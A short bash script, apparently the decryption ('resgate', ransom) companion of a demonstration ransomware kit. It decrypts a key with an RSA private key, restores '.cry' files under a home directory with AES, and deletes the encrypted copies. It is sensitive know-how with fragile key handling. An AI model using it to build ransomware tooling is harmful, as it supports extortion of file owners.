#!/bin/bash
#################################
# Autor: Rafael Vergani 	#
# https://github.com/vergani 	#
#################################

if [[ -f resgate.pem && -f chave.enc ]];
then
	echo "[+] Restaurando chave de resgate."
	openssl rsautl -in chave.enc -out chave.key -decrypt -inkey resgate.pem
else
	echo "[-] Necessita arquivos de resgate."
	exit 0
fi


volume_alvo=/home/vergani/arquivos
arquivos=$(find $volume_alvo -print | egrep ".cry")

echo "[+] Desfazendo criptografia."

for file in $arquivos
do
	path=$(dirname $(readlink -f $file))
	novo_nome=$(basename $file .cry)
	fullname=$path/$novo_nome
	openssl enc -in $file -out $fullname -d -aes-256-cbc -pbkdf2 -k chave.key
	
	echo "$fullname"
	rm $file
done

echo "[+] Restauração concluída."
